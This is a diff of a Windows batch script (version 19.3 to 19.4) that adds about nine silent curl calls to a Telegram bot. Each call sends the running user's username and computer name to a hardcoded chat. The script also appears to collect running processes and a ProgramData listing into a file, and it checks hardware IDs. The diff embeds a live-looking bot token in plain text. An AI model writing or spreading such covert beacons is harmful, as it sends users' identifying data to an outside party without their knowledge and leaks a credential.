@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=19.3"
+set "BATCHVERSION=19.4"
 
 
 
@@ -102,7 +102,7 @@ set "VALID_HWIDS="
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING105"
 
 
 
@@ -548,7 +548,7 @@ timeout /t 1 /nobreak >nul
 
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING551"
 
 
 
@@ -989,7 +989,7 @@ echo.
 
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING992"
 
 
 
@@ -1288,7 +1288,7 @@ echo.
 
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING1291"
 
 
 
@@ -1370,6 +1370,9 @@ echo.
 
 
 
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING1373"
+
+
 
 :CHECKIFRUNNING
 
@@ -1411,7 +1414,7 @@ echo CheckSend Now is = !CheckSend!
 
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING1417"
 
 
 :NEXT5
@@ -1494,7 +1497,7 @@ echo.
 
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING1500"
 
 
 
@@ -1554,7 +1557,7 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
-echo All running processes - Using Powershell - >> "%InstalledQWB%"
+echo All running processes Using Powershell  >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%ProcessTXTFILE%" >> "%InstalledQWB%"
@@ -1562,7 +1565,6 @@ del /f /q "%ProcessTXTFILE%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
-
 echo List ProgramData "%ProgramData%" files and folders >> "%InstalledQWB%"
 dir /b "%ProgramData%" >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1587,6 +1589,7 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 
 
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|RUNNING1592"
 
 
 for /L %%i in (1,1,13) do (
